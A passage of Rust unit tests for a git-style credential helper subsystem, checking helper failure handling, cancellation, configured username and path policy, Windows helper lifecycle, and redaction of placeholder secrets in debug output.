        assert!(!session.credential().complete());
    }

    #[cfg(unix)]
    #[test]
    fn helper_exit_and_protocol_failure_are_redacted() {
        let (_directory, helper) = helper("printf 'password=synthetic-secret\\n'; exit 7");
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let cancel = AtomicBool::new(false);
        let session =
            CredentialSession::fill(&config, context(false), &[helper], None, &cancel, None)
                .unwrap();
        assert!(matches!(
            session.helper_failures(),
            [(0, CredentialError::Exit("get"))]
        ));
        assert!(!session.credential().complete());
        assert!(!format!("{session:?}").contains("synthetic-secret"));
    }

    #[cfg(unix)]
    #[test]
    fn configured_username_and_path_policy_reach_helper() {
        let (_directory, helper) = helper(
            r#"input=$(cat); case "$input" in *'path=one/repo'*) printf 'password=synthetic-secret\n';; esac"#,
        );
        let config = Config::parse(
            b"[credential]\nhelper = synthetic\nusername = configured\nuseHttpPath = true\n",
        )
        .unwrap();
        let cancel = AtomicBool::new(false);
        let session =
            CredentialSession::fill(&config, context(false), &[helper], None, &cancel, None)
                .unwrap();
        assert_eq!(
            session.credential().username.as_deref(),
            Some(b"configured".as_slice())
        );
        assert_eq!(
            session.credential().password.as_deref(),
            Some(b"synthetic-secret".as_slice())
        );
    }
    #[cfg(unix)]
    #[test]
    fn failed_helper_allows_later_helper() {
        let (_first_dir, mut first) = helper("exit 7");
        first.configured_name = b"first".to_vec();
        let (_second_dir, mut second) =
            helper("printf 'username=sample\\npassword=synthetic-secret\\n\\n'");
        second.configured_name = b"second".to_vec();
        let config = Config::parse(b"[credential]\nhelper = first\nhelper = second\n").unwrap();
        let cancel = AtomicBool::new(false);
        let session = CredentialSession::fill(
            &config,
            context(false),
            &[first, second],
            None,
            &cancel,
            None,
        )
        .unwrap();
        assert!(session.credential().complete());
        assert!(matches!(
            session.helper_failures(),
            [(0, CredentialError::Exit("get"))]
        ));
    }

    #[cfg(unix)]
    #[test]
    fn successful_helper_may_close_stdin_before_reading() {
        let (_directory, helper) = helper("printf 'username=sample\\npassword=secret\\n\\n'");
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let mut context = context(false);
        context.host = vec![b'h'; 1024 * 1024];
        let cancel = AtomicBool::new(false);
        let session =
            CredentialSession::fill(&config, context, &[helper], None, &cancel, None).unwrap();
        assert!(session.credential().complete());
    }

    #[cfg(unix)]
    #[test]
    fn helper_quit_cancels_without_prompt() {
        let (_directory, helper) = helper("printf 'quit=true\\n\\n'");
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let cancel = AtomicBool::new(false);
        let result =
            CredentialSession::fill(&config, context(false), &[helper], None, &cancel, None);
        assert!(matches!(result, Err(CredentialError::Cancelled)));
    }
    #[test]
    fn configured_program_debug_hides_sensitive_values() {
        let helper = CredentialHelper {
            configured_name: b"synthetic-secret".to_vec(),
            backend: CredentialBackend::Program(CredentialProgram {
                executable: PathBuf::from("synthetic-secret"),
                arguments: vec!["synthetic-secret".into()],
                inherit_environment: false,
                environment: vec![("TOKEN".into(), "synthetic-secret".into())],
            }),
        };
        assert!(!format!("{helper:?}").contains("synthetic-secret"));
        assert!(!format!("{:?}", helper.backend).contains("synthetic-secret"));
    }
    #[cfg(windows)]
    #[test]
    fn native_windows_helper_lifecycle() {
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("helper.cmd");
        std::fs::write(
            &path,
            b"@echo off\r\nmore > nul\r\nif \"%1\"==\"get\" (\r\n  echo username=sample\r\n  echo password=synthetic-secret\r\n)\r\n",
        ).unwrap();
        let helper = CredentialHelper {
            configured_name: b"synthetic".to_vec(),
            backend: CredentialBackend::Program(CredentialProgram {
                executable: PathBuf::from("cmd.exe"),
                arguments: vec!["/D".into(), "/C".into(), path.into_os_string()],
                inherit_environment: false,
                environment: Vec::new(),
            }),
        };
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let cancel = AtomicBool::new(false);
        let context = CredentialContext {
            protocol: b"https".to_vec(),
            host: b"example.invalid".to_vec(),
            path: None,
            use_http_path: false,
        };
        let session =
            CredentialSession::fill(&config, context, &[helper], None, &cancel, None).unwrap();
        assert!(session.credential().complete());
        session.approve(&cancel, None).unwrap();
        session.reject(&cancel, None).unwrap();
    }
}
